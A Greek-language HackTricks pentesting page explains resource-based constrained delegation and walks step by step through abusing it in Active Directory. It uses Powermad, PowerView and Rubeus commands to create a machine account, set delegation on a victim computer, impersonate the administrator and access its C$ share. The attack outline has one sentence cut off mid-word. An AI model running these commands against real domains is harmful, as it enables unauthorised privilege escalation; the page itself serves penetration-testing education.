# Περιορισμένη Ανάθεση Πόρων

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Αρχές της Περιορισμένης Ανάθεσης Πόρων

Αυτό είναι παρόμοιο με τη βασική [Περιορισμένη Ανάθεση](constrained-delegation.md) αλλά **αντί να δίνει δικαιώματα σε ένα αντικείμενο να προσομοιώσει οποιονδήποτε χρήστη έναντι ενός υπηρεσίας**. Η Περιορισμένη Ανάθεση Πόρων **ορίζει στο αντικείμενο ποιος μπορεί να προσομοιώσει οποιονδήποτε χρήστη έναντι αυτού**.

Σε αυτήν την περίπτωση, το περιορισμένο αντικείμενο θα έχει ένα χαρακτηριστικό που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ με το όνομα του χρήστη που μπορεί να προσομοιώσει οποιονδήποτε άλλο χρήστη έναντι αυτού.

Μια άλλη σημαντική διαφορά από αυτήν την Περιορισμένη Ανάθεση σε σχέση με τις άλλες αναθέσεις είναι ότι οποιοσδήποτε χρήστης με **δικαιώματα εγγραφής σε έναν λογαριασμό μηχανής** (_GenericAll/GenericWrite/WriteDacl/WriteProperty κλπ_) μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Στις άλλες μορφές Ανάθεσης χρειαζόσασταν δικαιώματα διαχειριστή τομέα).

### Νέες Έννοιες

Στην Περιορισμένη Ανάθεση είχε αναφερθεί ότι η σημαία **`TrustedToAuthForDelegation`** μέσα στην τιμή _userAccountControl_ του χρήστη απαιτείται για να πραγματοποιηθεί ένα **S4U2Self**. Αλλά αυτό δεν είναι εντελώς αλήθεια.\
Η πραγματικότητα είναι ότι ακόμα και χωρίς αυτήν την τιμή, μπορείτε να πραγματοποιήσετε ένα **S4U2Self** έναντι οποιουδήποτε χρήστη αν είστε μια **υπηρεσία** (έχετε ένα SPN) αλλά, εάν έχετε το **`TrustedToAuthForDelegation`**, το επιστρεφόμενο TGS θα είναι **Δυνατό να Προωθηθεί** και εάν **δεν έχετε** αυτήν τη σημαία το επιστρεφόμενο TGS **δεν** θα είναι **Δυνατό να Προωθηθεί**.

Ωστόσο, εάν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** **ΔΕΝ είναι Δυνατό να Προωθηθεί** και προσπαθείτε να καταχραστείτε μια **βασική Περιορισμένη Ανάθεση**, **δεν θα λειτουργήσει**. Αλλά εάν προσπαθείτε να εκμεταλλευτείτε μια **Περιορισμένη Ανάθεση Πόρων**, θα λειτουργήσει (αυτό δεν είναι μια ευπάθεια, είναι μια λειτουργία, φαίνεται).

### Δομή Επίθεσης

> Εάν έχετε **ισοδύναμα δικαιώματα εγγραφής** σε έναν **λογαριασμό Υπολογιστή** μπορείτε να αποκτήσετε **προνομιούχη πρόσβαση** σε αυτήν τη μηχανή.

Υποθέστε ότι ο επιτιθέμενος έχει ήδη **ισοδύναμα δικαιώματα εγγραφής στον υπολογιστή θύμα**.

1. Ο επιτιθέμενος **διαρρέει** έναν λογαριασμό που έχει ένα **SPN** ή **δημιουργεί έναν** ("Υπηρεσία Α"). Σημειώστε ότι **οποιοσδήποτε** _Διαχειριστής Χρήστης_ χωρίς κανένα άλλο ειδικό προνόμιο μπορεί να **δημιουργήσει** έως και 10 **αντικείμενα Υπολογιστή (**_**MachineAccountQuota**_**)** και να τους ορίσει ένα SPN. Έτσι ο επιτιθέμενος μπορεί απλά να δημιουργήσει ένα αντικείμενο Υπολογιστή και να ορίσει ένα SPN.
2. Ο επιτιθέμενος **καταχράται το δικαίωμα
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στον τομέα χρησιμοποιώντας το [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Ρύθμιση Περιορισμένης Ανάθεσης Πόρων

**Χρήση του PowerShell module activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Χρησιμοποιώντας το powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Εκτέλεση ενός πλήρους επιθέσεως S4U

Καταρχήν, δημιουργήσαμε το νέο αντικείμενο Υπολογιστή με τον κωδικό πρόσβασης `123456`, οπότε χρειαζόμαστε το hash αυτού του κωδικού:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Αυτό θα εκτυπώσει τις κατακερματισμένες τιμές RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, μπορεί να πραγματοποιηθεί η επίθεση:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Μπορείτε να δημιουργήσετε περισσότερα εισιτήρια απλά ζητώντας μία φορά χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Σημείωση ότι οι χρήστες έχουν ένα χαρακτηριστικό που ονομάζεται "**Δεν μπορεί να ανατεθεί**". Αν ένας χρήστης έχει αυτό το χαρακτηριστικό σε True, δεν θα μπορείτε να προσομοιώσετε την ταυτότητά του. Αυτή η ιδιότητα μπορεί να εμφανιστεί στο bloodhound.
{% endhint %}

### Πρόσβαση

Η τελευταία γραμμή εντολών θα εκτελέσει την **πλήρη επίθεση S4U και θα εισάγει το TGS** από τον Διαχειριστή στον υπολογιστή-θύμα στην **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Διαχειριστή, οπότε θα μπορείτε να έχετε πρόσβαση στο **C$**.
```bash
ls \\victim.domain.local\C$
```
### Κατάχρηση διαφορετικών εισιτηρίων υπηρεσίας

Μάθετε για τα [**διαθέσιμα εισιτήρια υπηρεσίας εδώ**](silver-ticket.md#available-services).

## Σφάλματα Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το Kerberos είναι ρυθμισμένο να μην χρησιμοποιεί το DES ή το RC4 και εσείς παρέχετε μόνο το RC4 hash. Παρέχετε στο Rubeus τουλάχιστον το AES256 hash (ή απλά παρέχετε τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι ο χρόνος του τρέχοντος υπολογιστή είναι διαφορετικός από αυτόν του DC και το Kerberos δεν λειτουργεί σωστά.
* **`preauth_failed`**: Αυτό σημαίνει ότι το δοθέν όνομα χρήστη + hashes δεν λειτουργούν για σύνδεση. Μπορεί να έχετε ξεχάσει να βάλετε το "$" μέσα στο όνομα χρήστη κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
* Ο χρήστης που προσπαθείτε να προσομοιώσετε δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να την προσομοιώσετε ή επειδή δεν έχει αρκετά προνόμια)
* Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητήσετε ένα εισιτήριο για το winrm αλλά το winrm δεν εκτελείται)
* Ο δημιουργηθείς ψεύτικος υπολογιστής έχει χάσει τα προνόμια του πάνω στο ευάλωτο διακομιστή και χρειάζεται να τους επαναφέρετε.

## Αναφορές

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
